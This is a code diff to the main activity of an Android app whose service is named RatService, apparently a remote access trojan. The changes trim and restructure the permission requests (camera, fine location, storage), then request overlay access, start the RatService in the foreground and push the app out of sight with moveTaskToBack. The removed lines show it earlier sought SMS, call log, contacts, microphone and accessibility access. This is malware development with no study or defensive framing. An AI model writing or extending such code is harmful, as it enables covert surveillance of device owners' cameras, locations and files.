@@ -7,6 +7,7 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
+import android.os.Build
 import android.os.Bundle
 import android.os.Environment
 import android.os.Process
@@ -23,25 +24,21 @@ class MainActivity : ComponentActivity() {
     private lateinit var statusText: TextView
     private lateinit var requestPermissionsButton: Button
 
-    private val permissions = arrayOf(
-        Manifest.permission.RECORD_AUDIO,
+    private val requiredPermissions = arrayOf(
         Manifest.permission.CAMERA,
         Manifest.permission.ACCESS_FINE_LOCATION,
         Manifest.permission.ACCESS_COARSE_LOCATION,
-        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
         Manifest.permission.READ_EXTERNAL_STORAGE,
-        Manifest.permission.WRITE_EXTERNAL_STORAGE,
-        Manifest.permission.READ_SMS,
-        Manifest.permission.SEND_SMS,
-        Manifest.permission.READ_CALL_LOG,
-        Manifest.permission.READ_PHONE_STATE,
-        Manifest.permission.READ_CONTACTS
+        Manifest.permission.WRITE_EXTERNAL_STORAGE
     )
 
     private val permissionLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
-    ) { results ->
-        checkAndUpdateStatus()
+    ) { permissions ->
+        val allGranted = permissions.entries.all { it.value }
+        if (allGranted) {
+            startRatService()
+        }
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -52,7 +49,7 @@ class MainActivity : ComponentActivity() {
         requestPermissionsButton = findViewById(R.id.requestPermissionsButton)
 
         requestPermissionsButton.setOnClickListener {
-            requestAllPermissions()
+            checkAndRequestPermissions()
         }
 
         checkAndUpdateStatus()
@@ -63,7 +60,7 @@ class MainActivity : ComponentActivity() {
         var allGranted = true
 
         // Check regular permissions
-        for (permission in permissions) {
+        for (permission in requiredPermissions) {
             val isGranted = ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
             status.append("${permission.split(".").last()}: ${if (isGranted) "✓" else "✗"}\n")
             if (!isGranted) allGranted = false
@@ -113,30 +110,37 @@ class MainActivity : ComponentActivity() {
         return enabledServices.any { it.id.contains(packageName) }
     }
 
-    private fun requestAllPermissions() {
-        // Request regular permissions
-        permissionLauncher.launch(permissions)
+    private fun checkAndRequestPermissions() {
+        val permissionsToRequest = requiredPermissions.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }.toTypedArray()
 
-        // Request special permissions
-        if (!Settings.canDrawOverlays(this)) {
-            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
-        }
-
-        if (!checkUsageStatsPermission()) {
-            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
-        }
-
-        if (!Environment.isExternalStorageManager()) {
-            startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
-        }
-
-        if (!isAccessibilityServiceEnabled()) {
-            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+        if (permissionsToRequest.isEmpty()) {
+            startRatService()
+        } else {
+            permissionLauncher.launch(permissionsToRequest)
         }
     }
 
     private fun startRatService() {
+        // Check if we need to request overlay permission
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            val intent = Intent(
+                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                Uri.parse("package:$packageName")
+            )
+            startActivity(intent)
+        }
+
+        // Start the service
         val serviceIntent = Intent(this, RatService::class.java)
-        startForegroundService(serviceIntent)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent)
+        } else {
+            startService(serviceIntent)
+        }
+
+        // Minimize the app
+        moveTaskToBack(true)
     }
 }
